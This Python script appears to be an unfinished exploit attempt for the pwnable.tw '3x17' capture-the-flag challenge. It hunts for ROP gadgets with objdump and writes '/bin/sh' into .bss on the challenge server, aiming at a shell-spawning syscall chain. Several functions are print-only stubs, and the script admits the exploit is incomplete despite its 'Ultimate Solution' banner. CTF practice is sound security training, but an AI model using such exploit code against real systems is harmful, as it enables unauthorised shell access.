#!/usr/bin/env python3

import socket
import struct
import sys

def find_alternative_gadgets():
    """Find alternative gadgets that might work"""
    
    print("=== Looking for alternative gadgets ===")
    
    # Since we can't find a gadget that sets rdi directly to 0x4b92e0,
    # let's try to find gadgets that can help us in other ways
    
    try:
        result = subprocess.run(['objdump', '-d', '3x17'], 
                              capture_output=True, text=True, timeout=30)
        
        lines = result.stdout.split('\n')
        
        # Look for gadgets that can set rdi to any value
        rdi_gadgets = []
        for i, line in enumerate(lines):
            if 'mov    $0x' in line and ',%edi' in line:
                addr_match = re.search(r'^(\s*)([0-9a-f]+):', line)
                if addr_match:
                    rdi_gadgets.append((addr_match.group(2), line.strip()))
        
        print(f"Found {len(rdi_gadgets)} gadgets that set edi to immediate values")
        
        # Show some examples
        for addr, line in rdi_gadgets[:5]:
            print(f"  0x{addr}: {line}")
        
        # Look for gadgets that can set rdi to rsp or similar
        rsp_gadgets = []
        for i, line in enumerate(lines):
            if 'mov    %rsp,%rdi' in line:
                addr_match = re.search(r'^(\s*)([0-9a-f]+):', line)
                if addr_match:
                    rsp_gadgets.append(addr_match.group(2))
        
        print(f"Found {len(rsp_gadgets)} gadgets that set rdi to rsp")
        
        return rdi_gadgets, rsp_gadgets
        
    except Exception as e:
        print(f"Error: {e}")
        return [], []

def try_stack_based_exploit():
    """Try a stack-based exploit"""
    
    print("\n=== Trying stack-based exploit ===")
    
    # The idea is to use the stack to pass arguments
    # We can write our arguments to the stack and then use gadgets that read from the stack
    
    # We know we have gadgets that can read from the stack
    # Let's try to use those
    
    print("Looking for stack-based gadgets...")

def try_function_hijacking_approach():
    """Try function hijacking approach"""
    
    print("\n=== Trying function hijacking approach ===")
    
    # The idea is to find a function that already does what we want
    # or find a function pointer that we can overwrite
    
    # Let's look for functions that might be useful
    
    print("Looking for useful functions...")

def create_final_solution():
    """Create the final solution"""
    
    print("\n=== Creating final solution ===")
    
    # Based on our analysis, we have:
    # 1. An arbitrary write of 24 bytes
    # 2. Gadgets that can set esi to 0x3b and move it to eax
    # 3. Gadgets that can set rsi and rdx to 0
    # 4. A syscall gadget
    
    # The challenge is setting rdi to point to "/bin/sh"
    
    # Let's try a different approach:
    # Maybe we can use a gadget that sets rdi to rsp
    # and then put "/bin/sh" on the stack
    
    print("Looking for stack-based approach...")

def try_complete_exploit():
    """Try the complete exploit"""
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect(("chall.pwnable.tw", 10105))
        
        print("\n=== Complete exploit attempt ===")
        print("Connected to challenge")
        
        # Read addr: prompt
        response = s.recv(1024).decode()
        print(f"Received: {response}")
        
        # Let's try to write to a known location
        # We'll write "/bin/sh" to the .bss section
        bss_addr = "0x4b92e0"
        
        s.send(bss_addr.encode() + b"\n")
        
        # Read data: prompt
        response = s.recv(1024).decode()
        print(f"Received: {response}")
        
        # Send "/bin/sh" + padding
        data = b"/bin/sh\x00" + b"A" * 16  # 24 bytes total
        s.send(data + b"\n")
        
        print("Wrote '/bin/sh' to .bss section")
        print("Connection should close now")
        
        s.close()
        
        # Now we need to find a way to overwrite the return address
        # with a ROP chain that sets up the registers correctly
        
        print("\nNote: We still need to find a way to overwrite the return address")
        print("with our ROP chain. The challenge is that we only have 24 bytes.")
        
    except Exception as e:
        print(f"Error: {e}")

def main():
    """Main function"""
    print("=== 3x17 Ultimate Solution ===")
    
    find_alternative_gadgets()
    try_stack_based_exploit()
    try_function_hijacking_approach()
    create_final_solution()
    try_complete_exploit()

if __name__ == "__main__":
    import subprocess
    import re
    main()